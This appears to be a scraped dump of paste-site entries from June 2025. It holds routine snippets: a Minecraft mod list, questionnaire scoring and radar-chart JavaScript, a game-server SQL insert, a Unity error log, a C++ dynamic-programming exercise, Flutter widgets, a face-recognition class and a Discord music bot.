			c2me-fixes-chunkio-threading-issues: Concurrent Chunk Management Engine (Fixes/Chunk IO/Threading Issues) 0.2.0+alpha.11.16
			c2me-fixes-general-threading-issues: Concurrent Chunk Management Engine (Fixes/General/Threading Issues) 0.2.0+alpha.11.16
			c2me-fixes-worldgen-threading-issues: Concurrent Chunk Management Engine (Fixes/WorldGen/Threading Issues) 0.2.0+alpha.11.16
			c2me-fixes-worldgen-vanilla-bugs: Concurrent Chunk Management Engine (Fixes/WorldGen/Vanilla Bugs) 0.2.0+alpha.11.16
			c2me-notickvd: Concurrent Chunk Management Engine (No Tick View Distance) 0.2.0+alpha.11.16
			c2me-opts-allocs: Concurrent Chunk Management Engine (Optimizations/Memory Allocations) 0.2.0+alpha.11.16
			c2me-opts-chunk-access: Concurrent Chunk Management Engine (Optimizations/Chunk Access) 0.2.0+alpha.11.16
			c2me-opts-chunkio: Concurrent Chunk Management Engine (Optimizations/Chunk IO) 0.2.0+alpha.11.16
			c2me-opts-math: Concurrent Chunk Management Engine (Optimizations/Math) 0.2.0+alpha.11.16
			c2me-opts-scheduling: Concurrent Chunk Management Engine (Optimizations/Scheduling) 0.2.0+alpha.11.16
			c2me-opts-worldgen-general: Concurrent Chunk Management Engine (Optimizations/General WorldGen) 0.2.0+alpha.11.16
			c2me-opts-worldgen-vanilla: Concurrent Chunk Management Engine (Optimizations/Vanilla WorldGen) 0.2.0+alpha.11.16
			c2me-rewrites-chunk-serializer: Concurrent Chunk Management Engine (Rewrites/Chunk Serializer) 0.2.0+alpha.11.16
			c2me-rewrites-chunkio: Concurrent Chunk Management Engine (Rewrites/Chunk IO) 0.2.0+alpha.11.16
			c2me-server-utils: Concurrent Chunk Management Engine (Server Utils) 0.2.0+alpha.11.16
			c2me-threading-chunkio: Concurrent Chunk Management Engine (Threading/WorldGen) 0.2.0+alpha.11.16
			c2me-threading-lighting: Concurrent Chunk Management Engine (Threading/Lighting) 0.2.0+alpha.11.16
			c2me-threading-worldgen: Concurrent Chunk Management Engine (Threading/WorldGen) 0.2.0+alpha.11.16
			com_ibm_async_asyncutil: asyncutil 0.1.0
			net_objecthunter_exp4j: exp4j 0.4.8
			org_threadly_threadly: threadly 7.0
		cloth-config: Cloth Config v11 11.1.136
			cloth-basic-math: cloth-basic-math 0.6.1
		cmdkit: Command Debug Service 3.0.1
		fabric-api: Fabric API 0.92.6+1.20.1
			fabric-api-base: Fabric API Base 0.4.32+1802ada577
			fabric-api-lookup-api-v1: Fabric API Lookup API (v1) 1.6.37+1802ada577
			fabric-biome-api-v1: Fabric Biome API (v1) 13.0.14+1802ada577
			fabric-block-api-v1: Fabric Block API (v1) 1.0.12+1802ada577
			fabric-block-view-api-v2: Fabric BlockView API (v2) 1.0.3+924f046a77
			fabric-blockrenderlayer-v1: Fabric BlockRenderLayer Registration (v1) 1.1.42+1802ada577
			fabric-client-tags-api-v1: Fabric Client Tags 1.1.3+1802ada577
			fabric-command-api-v1: Fabric Command API (v1) 1.2.35+f71b366f77
			fabric-command-api-v2: Fabric Command API (v2) 2.2.14+1802ada577
			fabric-commands-v0: Fabric Commands (v0) 0.2.52+df3654b377
			fabric-containers-v0: Fabric Containers (v0) 0.1.67+df3654b377
			fabric-content-registries-v0: Fabric Content Registries (v0) 4.0.13+1802ada577
			fabric-convention-tags-v1: Fabric Convention Tags 1.5.6+1802ada577
			fabric-crash-report-info-v1: Fabric Crash Report Info (v1) 0.2.20+1802ada577
			fabric-data-attachment-api-v1: Fabric Data Attachment API (v1) 1.0.2+de0fd6d177
			fabric-data-generation-api-v1: Fabric Data Generation API (v1) 12.3.7+1802ada577
			fabric-dimensions-v1: Fabric Dimensions API (v1) 2.1.55+1802ada577
			fabric-entity-events-v1: Fabric Entity Events (v1) 1.6.1+1c78457f77
			fabric-events-interaction-v0: Fabric Events Interaction (v0) 0.6.5+13a40c6677
			fabric-events-lifecycle-v0: Fabric Events Lifecycle (v0) 0.2.64+df3654b377
			fabric-game-rule-api-v1: Fabric Game Rule API (v1) 1.0.41+1802ada577
			fabric-item-api-v1: Fabric Item API (v1) 2.1.29+1802ada577
			fabric-item-group-api-v1: Fabric Item Group API (v1) 4.0.14+1802ada577
			fabric-key-binding-api-v1: Fabric Key Binding API (v1) 1.0.38+1802ada577
			fabric-keybindings-v0: Fabric Key Bindings (v0) 0.2.36+df3654b377
			fabric-lifecycle-events-v1: Fabric Lifecycle Events (v1) 2.2.23+1802ada577
			fabric-loot-api-v2: Fabric Loot API (v2) 1.2.3+1802ada577
			fabric-loot-tables-v1: Fabric Loot Tables (v1) 1.1.47+9e7660c677
			fabric-message-api-v1: Fabric Message API (v1) 5.1.10+1802ada577
			fabric-mining-level-api-v1: Fabric Mining Level API (v1) 2.1.52+1802ada577
			fabric-model-loading-api-v1: Fabric Model Loading API (v1) 1.0.4+1802ada577
			fabric-models-v0: Fabric Models (v0) 0.4.3+9386d8a777
			fabric-networking-api-v1: Fabric Networking API (v1) 1.3.14+a158aa0477
			fabric-networking-v0: Fabric Networking (v0) 0.3.54+df3654b377
			fabric-object-builder-api-v1: Fabric Object Builder API (v1) 11.1.5+e35120df77
			fabric-particles-v1: Fabric Particles (v1) 1.1.3+1802ada577
			fabric-recipe-api-v1: Fabric Recipe API (v1) 1.0.24+1802ada577
			fabric-registry-sync-v0: Fabric Registry Sync (v0) 2.3.6+1802ada577
			fabric-renderer-api-v1: Fabric Renderer API (v1) 3.2.2+1802ada577
			fabric-renderer-indigo: Fabric Renderer - Indigo 1.5.3+85287f9f77
			fabric-renderer-registries-v1: Fabric Renderer Registries (v1) 3.2.47+df3654b377
			fabric-rendering-data-attachment-v1: Fabric Rendering Data Attachment (v1) 0.3.39+92a0d36777
			fabric-rendering-fluids-v1: Fabric Rendering Fluids (v1) 3.0.29+1802ada577
			fabric-rendering-v0: Fabric Rendering (v0) 1.1.50+df3654b377
			fabric-rendering-v1: Fabric Rendering (v1) 3.0.9+1802ada577
			fabric-resource-conditions-api-v1: Fabric Resource Conditions API (v1) 2.3.9+1802ada577
			fabric-resource-loader-v0: Fabric Resource Loader (v0) 0.11.12+fb82e9d777
			fabric-screen-api-v1: Fabric Screen API (v1) 2.0.9+1802ada577
			fabric-screen-handler-api-v1: Fabric Screen Handler API (v1) 1.3.33+1802ada577
			fabric-sound-api-v1: Fabric Sound API (v1) 1.0.14+1802ada577
			fabric-transfer-api-v1: Fabric Transfer API (v1) 3.3.6+8dd72ea377
			fabric-transitive-access-wideners-v1: Fabric Transitive Access Wideners (v1) 4.3.2+1802ada577
		fabricloader: Fabric Loader 0.16.14
			mixinextras: MixinExtras 0.4.1
		java: OpenJDK 64-Bit Server VM 17
		minecraft: Minecraft 1.20.1
		protosky: ProtoSky 1.3.0
	Server Running: true
	Player Count: 1 / 8; [class_3222['Quantum_rage'/3, l='ServerLevel[New World]', x=8.50, y=80.19, z=8.50]]
	Data Packs: vanilla, fabric, builtin/aether_accessories, file/skyblock_changes.zip
	Enabled Feature Flags: minecraft:vanilla
	World Generation: Experimental
	Type: Integrated Server (map_client.txt)
	Is Modded: Definitely; Client brand changed to 'fabric'; Server brand changed to 'fabric'
	Launched Version: fabric-loader-0.16.14-1.20.1"
iy0ZNqBC,dataNone,TestGuy1,JSON,Tuesday 17th of June 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3439991dcd827b51a00c2d2fe2eeb4d727d7dab7de9c4108c16591056490ce88efc7a552642df4a4db183a6885c6d477700876eeb89915d84b12aa6a97ba465112a403a705cd1d645c5affe3dfa7ea086581d2eb8c3db21c4e332a884e20b3cc51ffd98b8e2d5a13b195ac386a616e43116ba570a9d72c7ab4b4d7fa10e4533a',
  otherdata: [
    '94400a15f229f954ff2cf6fc9c648ab5',
    'eb223d0f29e054638a8b1347cd3d5f87',
    '109e96c132282d132e43f196fe94e2fb',
    '6baca12b98b6e79a273fc565aca90ed3',
    '116c738c7ba2ca55f74c5615b36bfd5f',
    'b1a025aec73db88aa186f45169aefe3c',
    'e0a2e0d97b2ec1f9669ca79f5cc05ddc',
    '5a6e9d8928f2c921cf0f6a112c6d26bf'
  ]
}"
qvwQceUx,Untitled,ciaojep,JavaScript,Tuesday 17th of June 2025 05:50:16 AM CDT,"// 1) Configurazione delle aree, con max e descrizioni per fascia
const areas = [
  {
    id: 16, key: 'leadership',      label: 'Leadership',      max: 4 * 5,
    desc: [
      'Leadership basso: Nel tuo lavoro preferisci occuparti di un ambito circoscritto, magari sotto la supervisione di qualcuno, senza dover considerare anche il lavoro che potrebbe essere fatto da altri.',
      'Leadership medio: Sei in grado di organizzare il lavoro quello degli altri, ma preferisci occuparti esclusivamente dell\'ambito che è di tua competenza.',
      'Leadership alto: Hai spiccate doti di leadership e una forte attitudine a organizzare e dirigere il lavoro degli altri.'
    ]
  },
  {
    id: 45, key: 'selfcapability',  label: 'Self-Capability', max: 0,
    desc: [
      'Self-capability basso: Tendi a ritenerti poco competente, questo incide sulla soddisfazione che ricavi da quello che fai e sulla percezione di poter controllare le situazioni.',
      'Self-capability medio: Ti ritieni pronto in parte a mettere in atto le tue competenze, di conseguenza non sempre hai soddisfazione in quello che fai. Senti di poter controllare solo in parte gli eventi.',
      'Self-capability alto: Sei fortemente convinto delle tue competenze e i risultati che ottieni ti soddisfano. Le situazioni e gli eventi che incontri sono sfide che affronti positivamente per poter confermare le tue abilità.'
    ]
  },
  {
    id: 46, key: 'innovation',      label: 'Innovation',      max: 2 * 5,
    desc: [
      'Innovation basso: Ciò che è nuovo ti spaventa un po\' e preferisci affidarti a metodi collaudati per affrontare il tuo lavoro.',
      'Innovation medio: Le cose nuove presentano secondo te il loro fascino, ma nel lavoro è meglio affidarsi a metodi collaudati e per questo più sicuri.',
      'Innovation alto: Sei caratterizzato/a da una spiccata curiosità verso tutto ciò che è nuovo, e ritieni che guardarti intorno possa davvero essere un modo per affrontare il tuo lavoro.'
    ]
  },
  {
    id: 47, key: 'problemsolving',  label: 'Problem Solving',  max: 2 * 5,
    desc: [
      'Problem Solving basso: Spesso non riesci ad affrontare le questioni con approccio nuovo, tenti a preferire i metodi lineari tradizionali nel risolvere i problemi.',
      'Problem Solving medio: Ti dimostri abbastanza abile nell’affrontare problematiche abbandonando i modelli tradizionali e sei attratto dalle modalità del pensiero divergente.',
      'Problem Solving alto: Affronti con passione le questioni con creatività e con nuove idee. Da tempo hai abbandonato i modelli lineari nelle tue decisioni.'
    ]
  },
  {
    id: 48, key: 'goalorientation', label: 'Goal Orientation', max: 2 * 5,
    desc: [
      'Goal Orientation basso: Nella tua vita il caso e gli altri hanno un ruolo importante nel determinare la tua posizione. Tendi ad essere dispersivo/a e a interrompere le attività intraprese senza portarle a termine.',
      'Goal Orientation medio: Senti di avere il controllo su ciò che ti accade, anche se il caso e/o le altre persone giocano un ruolo non irrilevante nel determinare la tua posizione nel lavoro e nella vita. Sei una persona sufficientemente determinata anche se la tua energia non è senza limiti.',
      'Goal Orientation alto: Sei sicuro/a di avere sempre il controllo su ciò che accade e sei convinto/a che la posizione che ricopri nel lavoro e nella vita dipendono dalle tue abilità e dalle tue competenze. La tua energia e la tua determinazione ti permettono di essere persistente nel raggiungimento di un obiettivo. Non ti abbatti facilmente di fronte agli ostacoli, perché sei convinto/a che esistono sempre mezzi che ti permettono di superarli.'
    ]
  },
  {
    id: 58, key: 'risktaking',     label: 'Risk Taking',     max: 3 * 5,
    desc: [
      'Risk Taking basso: Non ami metterti in gioco, affrontando l\'incertezza o possibili insuccessi. Spesso non ti senti pronto ad affrontare le situazioni che a volte possono non esserti favorevoli.',
      'Risk Taking medio: Non temi di affrontare eventi incerti o eventi che possono anche portare a possibili insuccessi. Sei interessato ad affrontare situazioni che possono non esserti favorevoli.',
      'Risk Taking alto: Cerchi spesso di affrontare progetti innovativi e incerti anche se con margini elevati di insuccesso. Sei fortemente attratto da situazioni che possono non esserti favorevoli.'
    ]
  },
  {
    id: 57, key: 'general',         label: 'Generale',        max: 100,
    desc: [
      'Generale basso: Sei una persona più adatta ad un\'attività lavorativa di tipo dipendente, o comunque un\'attività nella quale non ci siano eccessivi spazi personali di scelta. Ti senti più a tuo agio quando altri dirigono il tuo lavoro. Per questi motivi la tua attitudine all\'imprenditoria sembra non essere particolarmente elevata.',
      'Generale medio: Hai una moderata attitudine all\'imprenditoria, che potrebbe dare frutti positivi con un impegno ad accrescere le tue caratteristiche di creatività e competenza specifica e con una maggiore fiducia nel controllo che puoi esercitare sulla realtà.',
      'Generale alto: La tua attitudine imprenditoriale risulta essere elevata.'
    ]
  }
];

// 2) Soglie
const TH = { low: 35, med: 70 };

// 3) Icone fas
const ICONS = [
  'fas fa-arrow-down',
  'fas fa-arrows-alt-h',
  'fas fa-arrow-up'
];

// 4) Calcola percentuali, inietta commenti/output e prepara dati per il chart
const labels = [], data = [];

areas.forEach(a => {
  const inp = document.querySelector(`input[name=""leform-math-${a.id}""]`);
  const raw = inp ? parseFloat(inp.value) : NaN;
  const pct = a.id === 57
    ? (isNaN(raw) ? 0 : raw)
    : (a.max > 0 && !isNaN(raw) ? Math.round(raw / a.max * 100) : 0);
  const clamped = Math.min(100, Math.max(0, pct));

  // commenti/output per tutte le aree (inclusa general)
  const idx = (!isFinite(clamped) || a.max === 0) ? null
            : clamped <= TH.low ? 0
            : clamped <= TH.med ? 1
            : 2;
  const cEl = document.getElementById('commento-' + a.key);
  const oEl = document.getElementById('output-'   + a.key);
  if (cEl) cEl.innerHTML = idx===null
    ? 'N/A'
    : `<i class=""${ICONS[idx]}"" style=""font-style:normal;""></i> ${a.desc[idx]}`;
  if (oEl) oEl.textContent = (a.id===57)
    ? `${clamped}%`
    : (isNaN(raw)? '' : `${clamped}% (${raw}/${a.max})`);

  // ma per il chart aggiungo solo le aree diverse da general
  if (a.id !== 57) {
    labels.push(a.label);
    data.push(clamped);
  }
});

// 5) Disegna il radar chart senza “Generale”
const container = document.getElementById('radarChartContainer');
if (container) {
  const old = container.querySelector('canvas');
  if (old) container.removeChild(old);
  const canvas = document.createElement('canvas');
  container.style.height = '400px';
  container.appendChild(canvas);
  new Chart(canvas.getContext('2d'), {
    type: 'radar',
    data: { labels, datasets:[{
      data,
      fill:true,
      backgroundColor:'rgba(52,152,219,0.25)',
      borderColor:'rgba(41,128,185,1)'
    }]},
    options: {
      responsive:true,
      maintainAspectRatio:false,
      scales: { r:{min:0,max:100,ticks:{stepSize:20}} },
      plugins:{legend:{display:false}}
    }
  });
}

"
3y3k2EsZ,Мифик Бокс(запрос на добавление кастом итем),Sansuall,MySQL,Tuesday 17th of June 2025 05:44:20 AM CDT,"-- Мифический бокс
INSERT INTO world_bfa_cp.item_template6 (entry, InventoryType, AllowableClass, AllowableRace, ItemLevel, subclass, name, name_loc8, class, itemset, tooltip, tooltip_loc8) VALUES (300122, 0, -1, -1, 30, 5, 'The Eternal Palace Mythic (445 ilvl + other)', 'Вечный Дворец Мифический (445 ilvl + допы)', 22, 0, 'When you purchase, you get one item 445 ilvl, as well as from 1000 to 7000 gold, from 500 to 2500 units of Heart of Azeroth experience, as well as reputation with some factions (each category has its own % of random drop).', 'При приобретении вы получаете одну вещь 445 ilvl, а также от 1000 до 7000 золота, от 500 до 2500 ед.опыта Сердца Азерот, и репутацию с некоторыми фракциями (каждая категория имеет свой % случайного выпадения).');


-- Запрос на добавления в кабинет(в кастом добавлена 1):
REPLACE INTO TItemPrice VALUES
(300122, 2, 1150, 'Y', 000, '0', 1, 0);"
08bgGZG4,Untitled,artembelaev,VeriLog,Tuesday 17th of June 2025 05:35:26 AM CDT,"2025.06.17 15:19:37.279 10230 10956 Error Unity ServerUnknownException: Request error. Code: 4003, Message: Player not accepted EULA
2025.06.17 15:19:37.279 10230 10956 Error Unity   at XDevs.Server.TF.TFServer+AbstractProcessor.ProcessResponse (XDevs.Server.TF.TFRequest req, System.String responseText, System.String incomingSig, System.String dataSig) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at XDevs.Server.TF.TFServer+AbstractProcessor.ProcessResponse (XDevs.Server.TF.TFRequest req, System.String responseText, System.String incomingSig, System.String dataSig) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at XDevs.Server.TF.TFServer+HttpClientProcessor.DoRequest (XDevs.Server.TF.TFRequest req, System.Threading.CancellationToken token) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at System.Threading.Tasks.AwaitTaskContinuation.RunOrScheduleAction (System.Action action, System.Boolean allowInlining, System.Threading.Tasks.Task& currentTask) [0x00000] in <00000000000000000000000000000000>:0 
2025.06.17 15:19:37.279 10230 10956 Error Unity   at System.Threading.Tasks.Task.FinishContinuations () [0x00000] in <00000000000000000
"
dSp3Fg7z,Maximum sum Non Adjacent Element,Fastrail08,C++,Tuesday 17th of June 2025 03:46:08 AM CDT,"#include <bits/stdc++.h>
using namespace std;

void getMaximumSum(int index, int sum, int lastInc, int &maxSum, vector<int> &v){
    if(index >= v.size()){
        maxSum = max(maxSum, sum);
        return;
    }
    //select the number
    if(lastInc == -1 || lastInc < index - 1){
        getMaximumSum(index + 1, sum + v[index], index, maxSum, v);
    }
    
    //don't select the number
    getMaximumSum(index + 1, sum, lastInc, maxSum, v);
}

int getMaximumSumMemo(int index, int lastInc, vector<int> &v, vector<vector<int> > &memo){
    if(index >= v.size()){
        return 0;
    }
    if(lastInc != -1 && memo[index][lastInc] != -1){
        return memo[index][lastInc];
    }
    int selected = 0, notSelected = 0;
    // select the number
    if(lastInc == -1 || lastInc < index - 1){
        selected = v[index] + getMaximumSumMemo(index + 1, index, v, memo);
    }
    notSelected = getMaximumSumMemo(index + 1, lastInc, v, memo);
    if(lastInc != -1){
        memo[index][lastInc] = max(selected, notSelected); 
    }
    return max(selected, notSelected);
}

int getMaximumSumMemoOptimisedSpace(int index, int lastInc, vector<int> &v, vector<vector<int> > &memo){
    if(index >= v.size()){
        return 0;
    }
    int selected = 0, notSelected = 0;
    if(memo[index][lastInc] != -1){
        return memo[index][lastInc];
    }
    //selected
    if(lastInc == 0){
        selected = v[index] + getMaximumSumMemoOptimisedSpace(index + 1, 1, v, memo);
    }
    
    //not selected
    notSelected = getMaximumSumMemoOptimisedSpace(index + 1, 0, v, memo);
    
    return memo[index][lastInc] = max(selected, notSelected);
}

int main() {
	// your code goes here
    int n;
    cin >> n;
    vector<int> v(n);
    for(int i = 0; i < n; i++){
        cin >> v[i];
    }
    /*
    Recursive Call
    int maxSum = 0;
    getMaximumSum(0, 0, -1, maxSum, v);
    cout << maxSum << '\n';
    */
    
    /*
    Memo Call
        vector<vector<int> > memo(n, vector<int>(n, -1));
        cout << getMaximumSumMemo(0, -1, v, memo) << '\n';
    */
    
    /*
    Memo Call Optimised
    
    */
    
    vector<vector<int> > memo(n, vector<int>(2, -1));
    cout << getMaximumSumMemoOptimisedSpace(0, 0, v, memo);

}
"
hWEzirvy,Untitled,darrenbarnett,Java,Tuesday 17th of June 2025 03:34:53 AM CDT,"// Superclass
public class Animal {
    protected String name;
    protected int age;
    
    public Animal(String name, int age) {
        this.name = name;
        this.age = age;
    }
    
    public void eat() {
        System.out.println(name + "" is eating."");
    }
    
    public void sleep() {
        System.out.println(name + "" is sleeping."");
    }
    
    public String getName() {
        return name;
    }
    
    public int getAge() {
        return age;
    }
}

// Subclass
public class Dog extends Animal {
    private String breed;
    
    public Dog(String name, int age, String breed) {
        super(name, age);  // Call superclass constructor
        this.breed = breed;
    }
    
    public void bark() {
        System.out.println(name + "" is barking!"");
    }
    
    public String getBreed() {
        return breed;
    }
}

public class Main {
    public static void main(String[] args) {
        Dog myDog = new Dog(""Buddy"", 3, ""Golden Retriever"");
        myDog.eat();    // Inherited from Animal
        myDog.sleep();  // Inherited from Animal
        myDog.bark();   // Specific to Dog
    }
}

"
dZGUKFBN,Untitled,Codymawerick,Python,Tuesday 17th of June 2025 03:20:15 AM CDT,"import face_recognition
import os
import configparser

class FaceRecognition:
    def __init__(self):
        config = configparser.ConfigParser()
        config.read(os.path.join(os.path.dirname(os.path.dirname(__file__)), 'config', 'config.ini'))
        self.known_face_encodings = []
        self.known_face_names = []
        faces_dir = config['Paths']['faces_dir']
        for filename in os.listdir(os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', faces_dir)):
            if filename.endswith(('.jpg', '.png')):
                image = face_recognition.load_image_file(os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', faces_dir, filename))
                encoding = face_recognition.face_encodings(image)
                if encoding:
                    self.known_face_encodings.append(encoding[0])
                    self.known_face_names.append(os.path.splitext(filename)[0])

    def recognize_face(self, frame):
        rgb_frame = frame[:, :, ::-1]  # Конвертация BGR (OpenCV) в RGB (face_recognition)
        face_locations = face_recognition.face_locations(rgb_frame)
        face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)

        worker_name = ""Неизвестный""
        face_recognized = False
        for face_encoding in face_encodings:
            matches = face_recognition.compare_faces(self.known_face_encodings, face_encoding)
            if True in matches:
                face_recognized = True
                worker_name = self.known_face_names[matches.index(True)]
                break
        return face_locations, worker_name, face_recognized"
nXyS34xk,vertical listview flutter,muhaiminurabir,Dart,Tuesday 17th of June 2025 03:08:45 AM CDT,"  Widget cartList() {
    return context.watch<CartProvider>().cartResponse != null &&
            context.watch<CartProvider>().cartResponse?.items != null &&
            context.watch<CartProvider>().cartResponse!.items!.isNotEmpty
        ? ListView.builder(
          shrinkWrap: true,
          scrollDirection: Axis.vertical,
          itemCount: context.watch<CartProvider>().cartResponse?.items?.length,
          itemBuilder: (BuildContext context, int index) {
            return Row(
              mainAxisSize: MainAxisSize.min,
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Expanded(
                  child: Text(
                    context
                            .watch<CartProvider>()
                            .cartResponse
                            ?.items
                            ?.elementAt(index)
                            ?.productName ??
                        """",
                    style: GoogleFonts.roboto(
                      fontSize: 14,
                      fontWeight: FontWeight.w400,
                      color: ProjectColors().blue3,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    softWrap: true,
                    textAlign: TextAlign.start,
                  ),
                ),
                Text(
                  context
                          .watch<CartProvider>()
                          .cartResponse
                          ?.items
                          ?.elementAt(index)
                          ?.totalPrice ??
                      ""0"",
                  style: GoogleFonts.roboto(
                    fontSize: 14,
                    fontWeight: FontWeight.w500,
                    color: ProjectColors().blue3,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                  softWrap: true,
                  textAlign: TextAlign.start,
                ),
              ],
            );
          },
        )
        : ColorLoader();
  }
"
PWKG7Hmf,horizontal listview flutter,muhaiminurabir,Dart,Tuesday 17th of June 2025 03:04:57 AM CDT," LimitedBox(
              maxHeight: 100,
              child: ListView.builder(
                shrinkWrap: true,
                scrollDirection: Axis.horizontal,
                itemCount:
                    context
                        .watch<CommonProvider>()
                        .productDetailsResponse
                        ?.data
                        ?.relatedItems
                        ?.data
                        ?.length,
                itemBuilder: (BuildContext context, int position) {
                  return GestureDetector(
                    onTap: () {
                      Navigator.of(context).push(
                        MaterialPageRoute(
                          builder:
                              (context) => ProductDetailsPage(
                                args: {
                                  ""id"":
                                      context
                                          .read<CommonProvider>()
                                          .productDetailsResponse
                                          ?.data
                                          ?.relatedItems
                                          ?.data?[position]
                                          ?.id,
                                },
                              ),
                        ),
                      );
                    },
                    child: Card(
                      color: ProjectColors().white,
                      elevation: 0,
                      shape: RoundedRectangleBorder(
                        side: BorderSide(
                          width: 1,
                          color: ProjectColors().white,
                        ),
                        borderRadius: BorderRadius.all(Radius.circular(10)),
                      ),
                      margin: EdgeInsets.all(5),
                      child: Padding(
                        padding: EdgeInsets.all(0),
                        child: SizedBox(
                          width: 56,
                          height: 56,
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: <Widget>[
                              CircleAvatar(
                                radius: 28,
                                child: CachedNetworkImage(
                                  height: 60,
                                  width: 60,
                                  imageUrl:
                                      context
                                          .watch<CommonProvider>()
                                          .productDetailsResponse
                                          ?.data
                                          ?.relatedItems
                                          ?.data?[position]
                                          ?.imageUrl ??
                                      """",
                                  placeholder:
                                      (context, url) => Image.asset(
                                        ""assets/images/placeholder_image.png"",
                                        height: 60,
                                        width: 60,
                                        fit: BoxFit.fill,
                                        scale: 10,
                                      ),
                                  errorWidget:
                                      (context, url, error) => Image.asset(
                                        ""assets/images/placeholder_image.png"",
                                        height: 60,
                                        width: 60,
                                        fit: BoxFit.fill,
                                        scale: 10,
                                      ),
                                  fit: BoxFit.cover,
                                  imageBuilder:
                                      (context, imageProvider) => CircleAvatar(
                                        backgroundImage: imageProvider,
                                      ),
                                ),
                              ),
                              Text(
                                context
                                        .watch<CommonProvider>()
                                        .productDetailsResponse
                                        ?.data
                                        ?.relatedItems
                                        ?.data?[position]
                                        ?.name ??
                                    """",
                                style: GoogleFonts.roboto(
                                  fontSize: 12,
                                  fontWeight: FontWeight.w500,
                                  color: ProjectColors().blue2,
                                ),
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis,
                                textAlign: TextAlign.center,
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  );
                },
              ),
            )"
sSkFL5Mr,Untitled,Hasli4,JavaScript,Tuesday 17th of June 2025 02:15:23 AM CDT,"// 1. Проверка числа: положительное, отрицательное или ноль
function checkNumber(n) {
  if (n > 0) {
    return ""Положительное"";
  } else if (n < 0) {
    return ""Отрицательное"";
  } else {
    return ""Ноль"";
  }
}

// 2. Проверка возраста
function checkAge(age) {
  if (age < 18) {
    return ""Доступ запрещён"";
  } else if (age <= 65) {
    return ""Доступ разрешён"";
  } else {
    return ""Доступ по договорённости"";
  }
}

// 3. Рейтинг товара
function ratingLabel(r) {
  if (r === 5) {
    return ""Отлично"";
  } else if (r === 4) {
    return ""Хорошо"";
  } else if (r === 3) {
    return ""Нормально"";
  } else if (r === 2) {
    return ""Плохо"";
  } else if (r === 1) {
    return ""Ужасно"";
  } else {
    return ""Рейтинг некорректен"";
  }
}

// 4. Проверка диапазона (включительно, порядок a и b не важен)
function inRange(x, a, b) {
  const min = Math.min(a, b);
  const max = Math.max(a, b);
  if (x >= min && x <= max) {
    return true;
  } else {
    return false;
  }
}

// 5. Скидка в магазине
function calcDiscount(sum) {
  let final;
  if (sum <= 1000) {
    final = sum;
  } else if (sum <= 5000) {
    final = sum * 0.95; // 5% скидка
  } else {
    final = sum * 0.90; // 10% скидка
  }
  return final;
}

// 6. Год високосный?
function isLeapYear(year) {
  if ((year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0)) {
    return true;
  } else {
    return false;
  }
}

// 7. Оценка по баллам
function grade(score) {
  if (score >= 90 && score <= 100) {
    return ""A"";
  } else if (score >= 80) {
    return ""B"";
  } else if (score >= 70) {
    return ""C"";
  } else if (score >= 60) {
    return ""D"";
  } else if (score >= 0) {
    return ""F"";
  } else {
    return ""Неверный балл"";
  }
}

// 8. Определение времени суток
function timeOfDay(hour) {
  if (hour >= 6 && hour <= 11) {
    return ""Утро"";
  } else if (hour >= 12 && hour <= 17) {
    return ""День"";
  } else if (hour >= 18 && hour <= 21) {
    return ""Вечер"";
  } else if ((hour >= 22 && hour <= 23) || (hour >= 0 && hour <= 5)) {
    return ""Ночь"";
  } else {
    return ""Неверный час"";
  }
}

// 9. Переписанная checkNumber с тернарным оператором
const checkNumberTernary = n =>
  n > 0 ? ""Положительное"" :
  n < 0 ? ""Отрицательное"" :
  ""Ноль"";

// 10. Тип билета
function ticketType(age, student) {
  if (age < 5) {
    return ""Бесплатно"";
  } else if (student === true) {
    return ""Студентский"";
  } else if (age > 60) {
    return ""Пенсионер"";
  } else {
    return ""Полный"";
  }
}
"
L3Mab1Gt,music,BETAlwrd,JavaScript,Tuesday 17th of June 2025 01:06:37 AM CDT,"function startBot(token) {
  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildVoiceStates,
      GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Channel]
  });

  client.botData = { token };
  bots.push(client);

  client.distube = new DisTube(client, {
    emitNewSongOnly: true,
    plugins: [

      new YtDlpPlugin({ update: true })
    ]
  });

  client.once(Events.ClientReady, async () => {
    const setup = getSetupData(client.user.username);
    if (!setup?.roomId) return;

    for (const [, guild] of client.guilds.cache) {
      const channel = guild.channels.cache.get(setup.roomId);
      if (channel) await joinVoiceChannel(client, channel);
    }
    console.log(`✅ Bot started: ${client.user.tag}`);
  });

  client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
    const setup = getSetupData(client.user.username);
    if (!setup?.roomId) return;

    const botId = client.user.id;
    const leftVC = oldState.channelId && !newState.channelId && oldState.id === botId;
    if (leftVC) {
      const key = `${botId}-${oldState.guild.id}`;
      if (rejoinLocks.has(key)) return;
      rejoinLocks.add(key);
      setTimeout(() => rejoinLocks.delete(key), 150);

      const channel = oldState.guild.channels.cache.get(setup.roomId);
      if (channel?.joinable) {
        try {
          await joinVoiceChannel(client, channel);
          console.log(`🔁 ${client.user.username} rejoined`);
        } catch (e) {
          console.error(e);
        }
      }
    }
  });
    client.login(token).catch(err => {
    console.error(`❌ Failed to login with token: ${token.slice(0, 10)}...`, err.message);
  });
}

function loadTokens() {
  if (!fs.existsSync(token_file_)) return [];
  try {
    const data = fs.readFileSync(token_file_, 'utf-8');
    return JSON.parse(data);
  } catch (err) {
    console.error(""خطأ أثناء قراءة tokens.json:"", err);
    return [];
  }
}

function saveTokens(tokens) {
  try {
    fs.writeFileSync(token_file_, JSON.stringify(tokens, null, 2));
  } catch (err) {
    console.error(""خطأ أثناء حفظ tokens.json:"", err);
  }
}
